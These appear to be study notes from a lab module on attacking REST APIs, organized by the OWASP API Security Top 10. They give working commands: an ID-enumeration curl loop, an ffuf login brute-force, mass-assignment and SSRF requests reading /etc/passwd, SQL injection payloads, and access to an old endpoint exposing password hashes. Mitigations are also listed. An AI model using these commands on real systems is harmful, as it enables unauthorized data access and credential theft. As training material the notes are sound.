# API Attacks

## 🎯 Main Idea
- Web APIs (REST, SOAP, GraphQL, gRPC) are a broad attack surface; this module targets a RESTful API and maps every vector to the OWASP API Security Top 10 (2023).
- Workflow: sign in per role to obtain a JWT (via Swagger UI), authorize, enumerate `current-user`/`roles` endpoints, then exploit each OWASP risk against the Inlanefreight E-Commerce Marketplace lab.

## 💥 Attack / Exploit Vectors

### API1 - Broken Object Level Authorization (BOLA / IDOR)
- Endpoint accepts a user-controlled key (e.g. integer `ID`) and fails to check resource ownership, letting you read other companies'/users' objects (CWE-639).
- Mass-abuse by looping through sequential IDs to dump many records (e.g. yearly reports).
- **Commands**
  - `for ((i=1; i<= 20; i++)); do curl -s -w "\n" -X 'GET' 'http://TARGET/api/v1/supplier-companies/yearly-reports/'$i'' -H 'accept: application/json' -H 'Authorization: Bearer <JWT>' | jq; done` — Bash loop to mass-fetch sequential objects via BOLA

### API2 - Broken Authentication
- Missing rate-limiting + weak password policy enable credential brute-forcing (CWE-307); OTPs / security-question answers with low entropy can also be brute-forced.
- Enumerate the failure string first, then fuzz email+password pairs.
- **Commands**
  - `ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://TARGET/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100` — two-wordlist ffuf brute-force filtering the fail message

### API3 - Broken Object Property Level Authorization
- Excessive Data Exposure (CWE-213): endpoint returns sensitive fields (email, phoneNumber, birthDate, password hash) the role should not see.
- Mass Assignment (CWE-915): PATCH accepts a sensitive property (e.g. `isExemptedFromMarketplaceFee`) the user should not control.
- **Commands**
  - `PATCH /api/v1/supplier-companies {"...","isExemptedFromMarketplaceFee":1}` — set a privileged property via mass assignment to dodge the marketplace fee

### API4 - Unrestricted Resource Consumption
- No size/extension/content validation or rate-limiting on uploads (CWE-400): upload huge files to exhaust disk, or upload arbitrary types (e.g. `.exe`).
- ASP.NET Core `wwwroot` static files are publicly accessible by default — uploaded files become directly downloadable (malware hosting, info disclosure).
- **Commands**
  - `dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30` — create a 30MB junk file to test size limits / disk exhaustion
  - `dd if=/dev/urandom of=reverse-shell.exe bs=1M count=10` — create an `.exe` to test extension validation
  - `curl -O http://TARGET/SupplierCompaniesCertificatesOfIncorporations/reverse-shell.exe` — retrieve uploaded file from public `wwwroot`

### API5 - Broken Function Level Authorization (BFLA)
- Endpoint declares a required role but never enforces it — a user with no roles can still invoke privileged functions (CWE-200). Difference vs BOLA: here the user isn't even authorized to touch the endpoint.
- **Commands**
  - `GET /api/v1/products/discounts` — invoke a role-gated endpoint with no roles assigned (missing RBAC check)

### API6 - Unrestricted Access to Sensitive Business Flows
- Leaked business data (discount dates/rates from the BFLA above) plus no purchase rate-limiting lets you buy all discounted stock and resell at full price.
- Chains directly with API5 and API4.

### API7 - Server-Side Request Forgery (SSRF / XPSA)
- Unvalidated user-controlled URI used to fetch resources (CWE-918). Here the file-URI field is mass-assignable, so point it at local files (`file:///etc/passwd`) and read them back as base64.
- **Commands**
  - `PATCH /api/v1/supplier-companies {"CertificateOfIncorporationPDFFileURI":"file:///etc/passwd"}` — mass-assign the file URI to a local path
  - `GET /api/v1/supplier-companies/{ID}/certificates-of-incorporation` — retrieve the targeted file contents (base64, decode with CyberChef)

### API8 - Security Misconfiguration (Injection)
- Unsanitized input concatenated into SQL (CWE-89): a trailing apostrophe triggers an error, confirming SQLi; also covers missing/insecure HTTP security headers and weak CORS (`Access-Control-Allow-Origin`) enabling CSRF.
- **Commands**
  - `GET /api/v1/products/laptop'/count` — single quote to confirm SQL injection
  - `GET /api/v1/products/laptop' OR 1=1 --/count` — boolean payload to return all rows (full table count)

### API9 - Improper Inventory Management
- Old/deprecated versions (e.g. `v0`) left exposed and unauthenticated, serving legacy/deleted data including password hashes.
- **Commands**
  - `GET /api/v0/customers/deleted` — reach a deprecated unauthenticated endpoint exposing deleted customers + password hashes

### API10 - Unsafe Consumption of APIs
- Blindly trusting third-party/upstream APIs (CWE-1357): risks are insecure transmission, inadequate validation, weak auth, insufficient rate-limiting, and inadequate monitoring of API-to-API traffic. (Concept-only, no lab exploit.)

## 🛠️ Key Tools & Concepts
- Swagger UI — enumerate/invoke endpoints; obtain and set JWT via Authorize button
- JWT bearer auth — per-role sign-in endpoints (`/authentication/{customers,suppliers}/sign-in`)
- `current-user` / `roles/current-user` endpoints — recon of identity and assigned RBAC roles
- ffuf — multi-wordlist brute-forcing with `-fr` fail-message filter
- curl + jq — scripted request loops and JSON parsing
- dd — generating arbitrary-size/extension test files
- CyberChef — base64 decoding of exfiltrated data
- OWASP API Security Top 10 (2023) — the vulnerability taxonomy for the whole module
- DTO (Data Transfer Object) — key mitigation pattern for data exposure / mass assignment

## 🛡️ Mitigations
- BOLA/BFLA: enforce object-ownership and role checks server-side (compare `companyID`, verify role before processing).
- Broken Auth: rate-limit logins, strong password policy (length, complexity, no common/leaked, history, rotation), add MFA/OTP.
- Property-level: use response/request DTOs exposing only intended fields; block updates to sensitive properties.
- Resource consumption: validate file size/extension/content, add rate-limiting, antivirus (ClamAV), lock down `wwwroot`.
- SSRF: whitelist permissible local paths/directories; serve files only from the designated folder.
- Misconfiguration: parameterized queries/ORM, input validation, OWASP Secure Headers, proper CORS.
- Inventory: deprecate/remove old versions (`v0`) or restrict to authenticated admins.
- Unsafe consumption: encrypt transport, validate/sanitize upstream data, robust auth, rate-limit, monitor.
